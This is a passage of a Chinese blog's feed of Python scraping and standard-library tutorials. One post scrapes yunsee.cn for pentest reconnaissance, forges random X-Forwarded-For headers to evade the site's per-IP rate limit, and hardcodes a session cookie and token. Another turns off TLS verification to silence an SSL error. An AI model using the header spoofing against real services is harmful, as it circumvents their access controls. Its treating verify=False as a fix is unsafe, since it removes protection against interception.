      &lt;hr&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Web安全" scheme="http://yoursite.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>云悉-爬取域名信息</title>
    <link href="http://yoursite.com/2018/08/18/%E4%BA%91%E6%82%89-%E7%88%AC%E5%8F%96%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF/"/>
    <id>http://yoursite.com/2018/08/18/云悉-爬取域名信息/</id>
    <published>2018-08-18T13:21:45.000Z</published>
    <updated>2018-08-22T09:14:17.790Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦<br><img src="\images\pasted-95.png" alt="upload successful"></p><h1 id="要达成的目的"><a href="#要达成的目的" class="headerlink" title="要达成的目的"></a>要达成的目的</h1><p>从云悉网在极短时间内多次获取要查询的域名信息，以在渗透测试前期对目标进行快速的信息收集</p><h1 id="目标网址"><a href="#目标网址" class="headerlink" title="目标网址"></a>目标网址</h1><p><a href="http://www.yunsee.cn" target="_blank" rel="noopener">http://www.yunsee.cn</a></p><p>云悉：WEB资产梳理、在线CMS指纹识别平台</p><h1 id="爬取过程"><a href="#爬取过程" class="headerlink" title="爬取过程"></a>爬取过程</h1><p>经过两次查询发现，云悉存在查询的时间间隔限制，大概在1分钟左右，通过F12，在网络一栏，一个个找请求成功的包，看post的200的请求，在响应里，找到我们想要的，类似于</p><p>whois_isp    Alibaba Cloud Computing (Beijing) Co., Ltd.<br>whois_mail    <a href="mailto:DomainAbuse@service.aliyun.com" target="_blank" rel="noopener">DomainAbuse@service.aliyun.com</a><br>whois_date    2019-01-23 06:48:26<br>ip    223.7.8.143<br>icp_id    京ICP备13013886号<br>cdn<br>os    Windows<br>server    Microsoft-IIS/7.5<br>whois_dns    dns13.hichina.com,dns14.hichina.com<br>whois_name    null<br>icp_name    北京谷安天下科技有限公司<br>create    2018-08-18 21:43:54</p><p>然后在消息头里编辑和重发</p><h1 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h1><p>云悉不允许频繁查询，所以我们想到了代理池，然而代理池多数要花钱，所以最后用随机ip数的方法解决</p><h4 id="第一种随机ip方法"><a href="#第一种随机ip方法" class="headerlink" title="第一种随机ip方法"></a>第一种随机ip方法</h4><p>import random</p><p>headers{‘X-Forwarded-For’: ‘%s’}</p><p>for i in range(0, 500):<br>    choice = (<br>        random.randint(1, 2),<br>        random.randint(1, 4),<br>        random.randint(1, 3),<br>        random.randint(1, 4),<br>        random.randint(1, 3),<br>        random.randint(1, 3),<br>        random.randint(1, 3),<br>        random.randint(1, 3),<br>        random.randint(1, 3),<br>        random.randint(1, 3),<br>    )</p><p>headers[“X-Forwarded-For”] = (str(random.randint(1, 255)) + “.”) + (str(random.randint(1, 255)) + “.”) + (<br>        str(random.randint(1, 255)) + “.”) + str(random.randint(1, 255))</p><h4 id="第二种随机ip方法"><a href="#第二种随机ip方法" class="headerlink" title="第二种随机ip方法"></a>第二种随机ip方法</h4><p>import random<br>import socket<br>import struct</p><p>headers{‘X-Forwarded-For’: ‘%s’}</p><p>random_ip =socket.inet_ntoa(struct.pack(‘&gt;I’, random.randint(1, 0xffffffff)))</p><p>headers[“X-Forwarded-For”] = random_ip</p><h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># -*- coding: utf-8 -*</span><br><span class="line">import requests</span><br><span class="line">import random</span><br><span class="line">import json</span><br><span class="line">import random</span><br><span class="line">import socket</span><br><span class="line">import struct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def post(domain):</span><br><span class="line">        &apos;&apos;&apos;</span><br><span class="line">        Auther: 史前、祝融</span><br><span class="line">        post函数用于向云悉请求要查询的域名信息，包括备案单位、邮箱、域名所有者、备案号、DNS、域名注册商</span><br><span class="line">        :param domain: 用于传递要查询的域名</span><br><span class="line">        :return: 正常查询：返回的是以Json格式呈现的域名信息</span><br><span class="line">                 异常查询：返回的是异常的原因</span><br><span class="line">        &apos;&apos;&apos;</span><br><span class="line"></span><br><span class="line">        #设置随机IP，以避过单个ip查询频繁限制</span><br><span class="line">        random_ip = socket.inet_ntoa(struct.pack(&apos;&gt;I&apos;, random.randint(1, 0xffffffff)))</span><br><span class="line">        headers =&#123;</span><br><span class="line">        &apos;Host&apos;: &apos;www.yunsee.cn&apos;,</span><br><span class="line">        &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0&apos;,</span><br><span class="line">        &apos;Accept-Language&apos;: &apos;en-US,en;q=0.5&apos;,</span><br><span class="line">        &apos;Accept-Encoding&apos;: &apos;gzip, deflate&apos;,</span><br><span class="line">        &apos;Referer&apos;: &apos;http://www.yunsee.cn/&apos;,</span><br><span class="line">        &apos;Content-Type&apos;: &apos;application/x-www-form-urlencoded; charset=UTF-8&apos;,</span><br><span class="line">        &apos;X-Requested-With&apos;: &apos;XMLHttpRequest&apos;,</span><br><span class="line">        &apos;Content-Length&apos;: &apos;97&apos;,</span><br><span class="line">        &apos;Cookie&apos;: &apos;__cfduid=d615e3e4064581ccc283392de521cc58b1534506150; yjs_id=54ba88144fa537011258f5befd166064; ctrl_time=1; Hm_lvt_020d18ec72d744884bf6b81cc118775b=1534507185,1534586778,1534587126,1534587154; laravel_session=eyJpdiI6IlNlbHg0WlBaYmVqWGd1ckdkZlFqT0E9PSIsInZhbHVlIjoiU1dDOWZtdGJkZVBIMHY3ckwyTFMyR21YYVFUTVFmSlBDSzVnTnE0Q0hBYnFIVXVjWkQ5dWkxQWdwVmNvTTdYdkFWMmVyeTNHRGJnXC9NYXRJRUt0d3RRPT0iLCJtYWMiOiJjOTg1MjlmNjlmM2MzZTg4MDYyOTU2OWM3MjA5NzNiZWU4YTdkN2Y1MTg4MjljNDlhMDMzYmQ3NzIyN2Y4MWRkIn0%3D; Hm_lpvt_020d18ec72d744884bf6b81cc118775b=1534587154&apos;,</span><br><span class="line">        &apos;Connection&apos;: &apos;keep-alive&apos;,</span><br><span class="line">        &apos;X-Forwarded-For&apos;: &apos;%s&apos;</span><br><span class="line">        &#125;</span><br><span class="line">        #向headers中的X-Forwarded-For参数传递随机IP</span><br><span class="line">        headers[&quot;X-Forwarded-For&quot;] = random_ip</span><br><span class="line">        #yunsee查询页面的url</span><br><span class="line">        url = &apos;http://www.yunsee.cn/home/getInfo&apos;</span><br><span class="line">        #异常捕获</span><br><span class="line">        try:</span><br><span class="line">            data = &#123;&apos;type&apos;:&apos;webinfo&apos;, &apos;string&apos;:&apos;d879af297g54df45&apos;, &apos;url&apos;:domain, &apos;_token&apos;:&apos;wv8Y74w1owhw0glf9gPvyIlfFrSaIvzIz9g8dU6i&apos;&#125;</span><br><span class="line">            #设置post的数据，以及超时时间</span><br><span class="line">            r = requests.post(url,headers=headers,data=data,timeout=15)</span><br><span class="line">            #捕获连接异常</span><br><span class="line">    </span><br><span class="line">            rcontent = r.content.decode()</span><br><span class="line">            # 对要查询的域名是否在白名单进行判断</span><br><span class="line">            if &quot;禁止&quot; in json.loads(rcontent)[&apos;mess&apos;]:</span><br><span class="line">                return &quot;不允许查询&quot;</span><br><span class="line">    </span><br><span class="line">            # 以Json格式返回数据</span><br><span class="line">            return json.loads(rcontent)[&apos;res&apos;]</span><br><span class="line">        except requests.ConnectionError as e:</span><br><span class="line">                return &quot;网络问题&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__==&apos;__main__&apos;:</span><br><span class="line">    post(&quot;aliyun.com&quot;)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="Python" scheme="http://yoursite.com/categories/Python/"/>
    
    
      <category term="Python" scheme="http://yoursite.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>x-path爬取CNNIC</title>
    <link href="http://yoursite.com/2018/08/18/X-path%E7%88%AC%E5%8F%96CNNIC/"/>
    <id>http://yoursite.com/2018/08/18/X-path爬取CNNIC/</id>
    <published>2018-08-18T09:05:45.000Z</published>
    <updated>2018-08-18T13:51:04.996Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦<br><img src="\images\pasted-95.png" alt="upload successful"></p><h1 id="XPath介绍"><a href="#XPath介绍" class="headerlink" title="XPath介绍"></a><strong>XPath介绍</strong></h1><p>XPath在python的爬虫学习中，起着举足轻重的地位，对比正则表达式 re两者可以完成同样的工作，实现的功能也差不多，但XPath明显比re具有优势，在网页分析上使re退居二线 。全称为<strong>XML Path Language</strong> 一种小型的<strong>查询语言</strong> 。</p><h1 id="它所具备的优点："><a href="#它所具备的优点：" class="headerlink" title="它所具备的优点："></a>它所具备的优点：</h1><p>1） 可在XML中查找信息   </p><p>2） 支持HTML的查找   </p><p>3） 通过元素和属性进行导航  </p><h1 id="python使用XPath"><a href="#python使用XPath" class="headerlink" title="python使用XPath"></a>python使用XPath</h1><p>由于XPath属于lxml库模块，所以首先要安装库lxml，可用<code>pip install  lxml</code>  安装，pip库的安装自行百度</p><h1 id="x-path简单调用方法"><a href="#x-path简单调用方法" class="headerlink" title="x-path简单调用方法"></a>x-path简单调用方法</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from lxml import  etree  </span><br><span class="line"></span><br><span class="line">selector=etree.HTML(源码)  #将源码转化为能被XPath匹配的格式selector.xpath(表达式) </span><br><span class="line"></span><br><span class="line">bg = shuju.xpath(&apos;/html/body/center[1]/table[1]/tr/td/font&apos;)</span><br></pre></td></tr></table></figure><h1 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import lxml</span><br><span class="line">from lxml import etree</span><br><span class="line">def get():</span><br><span class="line">   headers = &#123;</span><br><span class="line">   &apos;user-Agent&apos;:&apos;Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36&apos;,</span><br><span class="line">   &#125;</span><br><span class="line">   url = &apos;http://ipwhois.cnnic.cn/bns/query/Query/ipwhoisQuery.do?txtquery=8.8.8.8&amp;queryOption=ipv4&apos;</span><br><span class="line">   req = requests.get(url,headers=headers)</span><br><span class="line">   #etree提供了更快速方便解析提取html页面数据的方式</span><br><span class="line">   shuju = etree.HTML(req.text)</span><br><span class="line">   bg = shuju.xpath(&apos;/html/body/center[1]/table[1]/tr/td/font&apos;)</span><br><span class="line">   #将两个列表组成字典</span><br><span class="line">   res = dict(zip([x.text for x in bg[::2]],[x.text for x in bg[1::2]]))</span><br><span class="line">   for k,v in res.items():</span><br><span class="line">      print(k,v)</span><br><span class="line"></span><br><span class="line">if __name__==&apos;__main__&apos;:</span><br><span class="line">   get()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="Python" scheme="http://yoursite.com/categories/Python/"/>
    
    
      <category term="Python" scheme="http://yoursite.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>人生苦短，Python当歌-4</title>
    <link href="http://yoursite.com/2018/08/15/%E4%BA%BA%E7%94%9F%E8%8B%A6%E7%9F%AD%EF%BC%8CPython%E5%BD%93%E6%AD%8C-4/"/>
    <id>http://yoursite.com/2018/08/15/人生苦短，Python当歌-4/</id>
    <published>2018-08-15T14:46:29.000Z</published>
    <updated>2018-08-15T16:20:08.938Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦<br><img src="\images\pasted-95.png" alt="upload successful"></p><h1 id="爬虫"><a href="#爬虫" class="headerlink" title="爬虫"></a>爬虫</h1><p>爬虫，用Python写的很多的，re模块，BeautifulSoup模块，pyspider模块，pyquery等等</p><p>还要用到requests模块，urllib模块，urllib2模块，还有一个四叶草公司开发的hackhttp等等</p><p>BeautifulSoup模块和requests模块，Pyspider都要安装，因为是第三方库</p><p>目标网站：<a href="https://gaokao.chsi.com.cn/gkxx/zszcgd/dnzszc/201706/20170615/1611254988-%1.html" target="_blank" rel="noopener">https://gaokao.chsi.com.cn/gkxx/zszcgd/dnzszc/201706/20170615/1611254988-%1.html</a></p><p>要实现的目标是爬取学校的名字，并按省份分类放置</p><p>代码如下：</p><p>#encoding=utf-8</p><p>import  requests<br>import lxml<br>import json<br>import logging   #解决ssl错误的<br>import sys<br>from bs4 import BeautifulSoup as bs<br>logging.captureWarnings(True)<br>reload(sys)     #解决编码问题的<br>sys.setdefaultencoding(‘utf-8’)<br>def school():<br>    for i in range(2, 34, 1):<br>        try:<br>           url = ‘<a href="https://gaokao.chsi.com.cn/gkxx/zszcgd/dnzszc/201706/20170615/1611254988-%s.html&#39;%(str(i)" target="_blank" rel="noopener">https://gaokao.chsi.com.cn/gkxx/zszcgd/dnzszc/201706/20170615/1611254988-%s.html&#39;%(str(i)</a>)<br>           headers = {<br>               ‘User-Agent’: ‘Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0’}<br>           r = requests.get(url=url,headers=headers,verify=False)<br>           soup = bs(r.content,’lxml’)<br>           content2 = soup.find_all(name=”td”, attrs={“colspan”: “7”})[0].string<br>           f1 = open(“D:/%s.txt” % (content2), “wb”)<br>           content = soup.find_all(name=’tr’,attrs={“height”:”29”})<br>           for content1 in content:<br>             try:<br>               soup_content = bs(str(content1), “lxml”)<br>               soup_content1 = soup_content.find_all(name=”td”)<br>               f1.write(soup_content1[1].string +’\n’)<br>               print(soup_content1[1].string)<br>             except IndexError:<br>                 pass<br>        except IndexError:<br>            pass</p><p>if <strong>name</strong>==’<strong>main</strong>‘:<br>    school()</p><p>爬虫遇到的问题：</p><p><code>requests.exceptions.SSLError: HTTPSConnectionPool(host=&#39;gaokao.chsi.com.cn&#39;, port=443): Max retries</code> </p><p>解决方法：</p><p>import logging</p><p>logging.captureWarnings(True)</p><p>r = requests.get(url=url,verify=False)</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="Python" scheme="http://yoursite.com/categories/Python/"/>
    
    
      <category term="Python" scheme="http://yoursite.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>人生苦短，Python当歌-3</title>
    <link href="http://yoursite.com/2018/08/15/%E4%BA%BA%E7%94%9F%E8%8B%A6%E7%9F%AD%EF%BC%8Cpython%E5%BD%93%E6%AD%8C-3/"/>
    <id>http://yoursite.com/2018/08/15/人生苦短，python当歌-3/</id>
    <published>2018-08-15T12:55:29.000Z</published>
    <updated>2018-08-15T16:23:29.467Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦<br><img src="\images\pasted-95.png" alt="upload successful"></p><h1 id="常用的系统库"><a href="#常用的系统库" class="headerlink" title="常用的系统库"></a>常用的系统库</h1><p>Python 的标准库包括了很多的模块, 从 Python 语言自身特定的类型和声明, 到一些只用于少数程序的不著名的模块.</p><h3 id="sys模块"><a href="#sys模块" class="headerlink" title="sys模块"></a>sys模块</h3><p>可以通过help命令查看其文档</p><p>sys.argv是变量，命令行参数，专门向Python解释器传递参数他的功能是获取程序外部向程序传递的参数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#encoding=utf-8</span><br><span class="line">import sys</span><br><span class="line">print &quot;THIS FILE NAME IS:&quot;,sys.argv[0]</span><br></pre></td></tr></table></figure></p><p>结果是<code>THIS FILE NAME IS: D:/yinjijn.py</code></p><p>sys.stdin,sys.stdout,sys.stderr<br>处理标准输入，标准输出，标准错误</p><p>输出和错误是内建在每个unix系统中的管道<br>print的本质就是sys.stdout.write<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#encoding=utf-8</span><br><span class="line">for i in range(6):</span><br><span class="line">    print &quot;attck&quot;</span><br></pre></td></tr></table></figure></p><p>等同于<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#encoding=utf-8</span><br><span class="line">import  sys</span><br><span class="line">for i in range(6):</span><br><span class="line">    sys.stdout.write(&quot;just do it\n&quot;)</span><br></pre></td></tr></table></figure></p><p>stdout是一个类文件对象，调用了它的write函数就可以打印任何的字符串了，它不会自己添加回车，要我们添加\n但是只有write的办法，木有read的方法<br>是由于是类文件对象，因此你可以将任何类文件赋值，然后重定向输出</p><h3 id="os模块"><a href="#os模块" class="headerlink" title="os模块"></a><strong>os模块</strong></h3><p>常用的几个</p><p>import os</p><p>os.name      #判断现在正在实用的平台，Windows平台”nt”,linux平台”posix”</p><p>os.getcwd()        #获取当前目录</p><p>os.listdir(“D:/blog”)         #列D:/blog文件夹的目录</p><p>os.mkdir(“D:/gooann”)        #在本文件x夹下建立一个叫gooann的文件夹</p><p>os.listdir(“D:/gooann/items”)  #查看目录文件夹</p><p> os.rmdir(“blog”) #删除叫blog的文件夹</p><p>os.rename(“test.txt”,”test1.txt”) #将test.txt重名为test1.txt</p><p>os.remove(“test1.txt”)  #删除test1.txt的文件</p><p>os库提供了在Python中使用操作系统的命令的方法就是用os.system(）</p><h3 id="time模块"><a href="#time模块" class="headerlink" title="time模块"></a><strong>time模块</strong></h3><p>time模块很常用的，可以精确的知道程序的运行长短，看看常用的 </p><p>import time</p><p>time.time()   #获取当前时间的时间戳</p><p>1503480040.985</p><p> time.clock()  #获取进程的时间</p><p>60.641674890547975</p><p> time.localtime()  #时间戳转换成当地的时间</p><p>time.struct_time(tm_year=2017, tm_mon=8, tm_mday=23, tm_hour=17, tm_min=20, tm_sec=48, tm_wday=2, tm_yday=235, tm_isdst=0)</p><p>time.asctime()  #将元祖表示为’Wed Aug 23 17:24:07 2017’这种形式</p><h3 id="json模块"><a href="#json模块" class="headerlink" title="json模块"></a>json模块</h3><p>传递数据的XML和JSON</p><p>JSON(JavaScript Object Notation, JS 对象标记) 是一种轻量级的数据交换格式。它基于 ECMAScript (w3c制定的js规范)的一个子集，采用完全独立于编程语言的文本格式来存储和表示数据。简洁和清晰的层次结构使得 JSON 成为理想的数据交换语言。 易于人阅读和编写，同时也易于机器解析和生成，并有效地提升网络传输效率。</p><p>Python标准库中有JSON模块，主要是两个功能，序列化(encoding)与反序列化(decoding)</p><h5 id="encoding操作-dumps"><a href="#encoding操作-dumps" class="headerlink" title="encoding操作 :dumps()"></a>encoding操作 :dumps()</h5><p>#encoding=utf-8<br>import json<br>data = [{“username”:”gooann”,”password”:”shiqian”,”content”:(“shiqian”,”secer”)}]<br>print data<br>[{‘username’: ‘gooann’, ‘content’: (‘shiqian’, ‘secer’), ‘password’: ‘shiqian’}]<br>data_json = json.dumps(data)  #将data进行格式的编码转换<br>print data_json<br>[{“username”: “gooann”, “content”: [“shiqian”, “secer”], “password”: “shiqian”}]</p><p>这里的data_json是str类型，data是list类型</p><h5 id="decoding操作：loads"><a href="#decoding操作：loads" class="headerlink" title="decoding操作：loads()"></a>decoding操作：loads()</h5><p>data_load = json.loads(data_json)<br>print data_load</p><p>[{u’username’: u’gooann’, u’content’: [u’shiqian’, u’secer’], u’password’: u’shiqian’}]</p><h3 id="hashlib模块"><a href="#hashlib模块" class="headerlink" title="hashlib模块"></a>hashlib模块</h3><p>Python中的hashlib库提供了大量的摘要算法，又叫散列算法，哈希算法</p><p>口算一下MD5</p><p>#encoding=utf-8<br>import hashlib<br>md5 = hashlib.md5( )<br>md5.update(‘admin’)<br>print md5.hexdigest( )</p><p>21232f297a57a5a743894a0e4a801fc3</p><h3 id="random模块"><a href="#random模块" class="headerlink" title="random模块"></a><strong>random模块</strong></h3><p>就是生成随机数的</p><p>#encoding=utf-8<br>import random<br>random.random()  #生成大于等于0，小于等于1的随机浮点数<br>random.uniform(66,88)  #生成66到88之间的随机浮点数<br>80.51121638510607<br>random.randint(66,88)  #生成66到88的整数<br>88<br>random.choice(‘url’) #在url生成随机字符<br>‘u’<br>look = [1,2,3,4,5,6]<br>random.shuffle(look)  #打乱数字<br>look<br>[1, 4, 3, 5, 2, 6]</p><h1 id="常用的第三方库"><a href="#常用的第三方库" class="headerlink" title="常用的第三方库"></a>常用的第三方库</h1><p>第三方库顾名思义，得下载安装</p><p>安装第三方库</p><h5 id="第一种方法："><a href="#第一种方法：" class="headerlink" title="第一种方法："></a>第一种方法：</h5><p>用源码安装，去哪找呢？百度，谷歌，GitHub下载，下载好了压缩包，解压<br>LINUX或者MAC就直接git clone，然后进入目录，大部分都是都有setup.py，然后执行命令</p><p><code>python setup.py install</code></p><p>如果是Windows系统</p><p>打开目录，然后shift+右键，在此打开cmd/Powershell窗口，打开，然后执行命令</p><p><code>python setup.py install</code></p><h5 id="第二种方法："><a href="#第二种方法：" class="headerlink" title="第二种方法："></a>第二种方法：</h5><p>pip安装或者easy_install安装<br>简单粗暴，他们的第三方库都来自一个网站：<a href="http://pypi.python.org/pypi" target="_blank" rel="noopener">http://pypi.python.org/pypi</a><br>pip也要安装unix平台<br>$ sudo yum install python-pip<br>$ sudo apt-get install python-pip</p><p>Windows平台<br>可以下载get-pip.py<br>地址：<a href="https://bootstrap.pypa.io/get-pip.py" target="_blank" rel="noopener">https://bootstrap.pypa.io/get-pip.py</a><br>然后python get-pip.py</p><p>unix也可以用这种方法, pip install 第三方库的名称</p><h3 id="requests模块"><a href="#requests模块" class="headerlink" title="requests模块"></a>requests模块</h3><p>用于程序进行http协议的get和post的模块 </p><h5 id="GET请求"><a href="#GET请求" class="headerlink" title="GET请求"></a>GET请求</h5><p>尝试获取某个页面，得到了一个请求实例</p><p>#encoding=utf-8<br>import requests<br>url = requests.get(“<a href="http://www.gooann.com&quot;" target="_blank" rel="noopener">http://www.gooann.com&quot;</a>)</p><p>获取cookies       print url.cookies</p><p>获取头部信息        url.headers</p><p>http响应状态码       url.status_code</p><p>网页内容              url.text</p><p>以二进制的方式打开服务器并返回数据      url.content</p><h5 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h5><p>payload = {‘key1’: ‘value1’, ‘key2’: ‘value2’}</p><p> r = requests.post(“<a href="http://httpbin.org/post&quot;" target="_blank" rel="noopener">http://httpbin.org/post&quot;</a>, data=payload)</p><p> print r.text</p><p>{<br>  “args”: {},<br>  “data”: “”,<br>  “files”: {},<br>  “form”: {<br>    “key1”: “value1”,<br>    “key2”: “value2”<br>  },<br>  “headers”: {<br>    “Accept”: “<em>/</em>“,<br>    “Accept-Encoding”: “gzip, deflate”,<br>    “Connection”: “close”,<br>    “Content-Length”: “23”,<br>    “Content-Type”: “application/x-www-form-urlencoded”,<br>    “Host”: “httpbin.org”,<br>    “User-Agent”: “python-requests/2.18.4”<br>  },<br>  “json”: null,<br>  “origin”: “113.135.83.181”,<br>  “url”: “<a href="http://httpbin.org/post&quot;" target="_blank" rel="noopener">http://httpbin.org/post&quot;</a><br>}</p><p>没有data参数</p><p>r = requests.post(“<a href="http://httpbin.org/post&quot;" target="_blank" rel="noopener">http://httpbin.org/post&quot;</a>)</p><p>print r.text</p><p>{<br>  “args”: {},<br>  “data”: “”,<br>  “files”: {},<br>  “form”: {},<br>  “headers”: {<br>    “Accept”: “<em>/</em>“,<br>    “Accept-Encoding”: “gzip, deflate”,<br>    “Connection”: “close”,<br>    “Content-Length”: “0”,<br>    “Host”: “httpbin.org”,<br>    “User-Agent”: “python-requests/2.18.4”<br>  },<br>  “json”: null,<br>  “origin”: “113.135.83.181”,<br>  “url”: “<a href="http://httpbin.org/post&quot;" target="_blank" rel="noopener">http://httpbin.org/post&quot;</a><br>}</p><p>当data被赋值了之后，结果中才会多了form值，而form值就是post给服务器的内容</p><h3 id="PIL模块"><a href="#PIL模块" class="headerlink" title="PIL模块"></a>PIL模块</h3><p>python Imaging Library (PIL)是PythonWare公司提供的免费的图像处理工具包，是python下的图像处理模块，支持多种格式，并提供强大的图形与图像处理功能。</p><p>安装：UNIX平台<br>sudo apt-get install python-imaging<br>MAC平台<br>sudo easy_install PIL<br>Windows：<br>去官网直接下载exe安装，傻瓜式操作，传送门:<a href="http://pythonware.com/products/pil/" target="_blank" rel="noopener">http://pythonware.com/products/pil/</a></p><p>#####</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="Python" scheme="http://yoursite.com/categories/Python/"/>
    
    
      <category term="Python" scheme="http://yoursite.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>人生苦短，Python当歌-2</title>
    <link href="http://yoursite.com/2018/08/15/%E4%BA%BA%E7%94%9F%E8%8B%A6%E7%9F%AD%EF%BC%8CPython%E5%BD%93%E6%AD%8C-2/"/>
    <id>http://yoursite.com/2018/08/15/人生苦短，Python当歌-2/</id>
    <published>2018-08-15T07:32:29.000Z</published>
    <updated>2018-08-15T12:40:43.561Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦<br><img src="\images\pasted-95.png" alt="upload successful"></p><h1 id="理解Python函数"><a href="#理解Python函数" class="headerlink" title="理解Python函数"></a>理解Python函数</h1><p>在高中时代，就可以这么定义函数—–f(x)=8x+8 </p><p>在函数中，并没有规定函数是一个数，它可是任何东西，你想是啥就是啥，变量的本质，可以当作一个占位符</p><h1 id="定义函数"><a href="#定义函数" class="headerlink" title="定义函数"></a>定义函数</h1><p>代码块以 def 关键词开头，def这个简写来自define，后接函数标识符名称和圆括号()。<br>定义函数内容以冒号起始，然后必须缩进（四个空格或者一个tab键）</p><p>def 函数名(参数):<br>        函数体<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#encoding=utf-8</span><br><span class="line"></span><br><span class="line">def    geturl( ):</span><br><span class="line"></span><br><span class="line">​           print   &quot;get  it&quot;</span><br><span class="line"></span><br><span class="line">geturl( )</span><br></pre></td></tr></table></figure></p><h4 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h4><p>一般情况，要将返回的值传给一个变量，然后通过变量打印出来，如果没有，那就没有回显了</p><h1 id="全局变量and局部变量"><a href="#全局变量and局部变量" class="headerlink" title="全局变量and局部变量"></a>全局变量and局部变量</h1><p>局部变量：只在函数体内（某个范围内）起作用的就叫局部变量<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#coding = utf-8</span><br><span class="line"></span><br><span class="line">a = &apos;ad&apos;</span><br><span class="line">def  getit():</span><br><span class="line">        a = &apos;look&apos;</span><br><span class="line">        print &quot;this a is&quot;,a</span><br><span class="line">demo()</span><br><span class="line">print &quot;---------------&quot;</span><br><span class="line">print &quot;this a is&quot;,a</span><br></pre></td></tr></table></figure></p><p>全局变量：在函数的内外都能用，变量前加global<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#coding = utf-8</span><br><span class="line"></span><br><span class="line">a = 